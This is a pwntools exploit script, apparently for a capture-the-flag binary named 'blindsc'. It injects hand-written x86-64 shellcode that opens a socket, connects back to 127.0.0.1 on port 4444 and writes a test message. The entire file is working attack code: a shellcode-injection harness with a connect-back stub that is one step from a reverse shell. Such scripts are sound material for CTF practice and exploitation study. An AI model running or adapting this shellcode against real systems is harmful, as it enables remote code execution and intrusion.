#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('blindsc')
context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
brva 0x14D5
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():


    sc = asm(
        """
        /* socket(AF_INET, SOCK_STREAM, 0) */
        mov rax, 41
        mov rdi, 2
        mov rsi, 1
        xor rdx, rdx
        syscall

        mov rdi, rax     /* fd */

        /* sockaddr_in */
        push 0x0100007f      /* 127.0.0.1 */
        mov dword ptr [rsp-4], 0x5c11   /* port 4444 in htons (0x115c) */
        mov word ptr [rsp-6], 2
        sub rsp, 6

        mov rsi, rsp
        mov rdx, 16

        /* connect(fd, sockaddr, 16) */
        mov rax, 42
        syscall

        /* write(fd, msg, len) */
        mov rax, 1
        lea rsi, [rip+msg]
        mov rdx, 12
        syscall

        jmp done

        msg:
            .ascii "Hello bypass\\n"

        done:
            nop
        """
    )


    io.send(sc)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

